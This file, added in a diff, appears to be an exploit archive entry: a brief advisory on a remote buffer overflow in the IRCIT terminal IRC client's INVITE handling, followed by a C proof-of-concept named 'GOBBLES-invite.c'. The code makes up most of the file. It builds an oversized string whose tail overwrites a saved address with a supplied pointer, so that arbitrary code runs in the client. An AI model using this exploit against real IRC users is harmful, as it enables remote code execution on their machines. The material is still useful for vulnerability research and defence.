@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/4998/info
+
+IRCIT is a terminal based IRC client for Linux and Unix systems.
+
+IRCIT contains a remote buffer overflow vulnerability. When a INVITE message is received, the supplied from user data is copied into a fixed buffer of length MAXHOSTLEN. A maliciously formatted message may overflow this buffer and execute arbitrary code as the IRCIT client. 
+
+/* GOBBLES-invite.c */
+
+#include <stdio.h>
+
+int
+main(int argc, char **argv)
+{
+        char heh[175], *store;
+        int i;
+
+        if(argc == 1) exit(0);
+
+        sscanf(argv[1], "%p", &store);
+        memset(heh, 'x', sizeof(heh));
+        *(long *)&heh[166] = (long)store;
+        *(long *)&heh[170] = (long)store;
+        heh[174] = '\0';
+
+        fprintf(stdout, "%s", heh);
+        exit(0);
+}
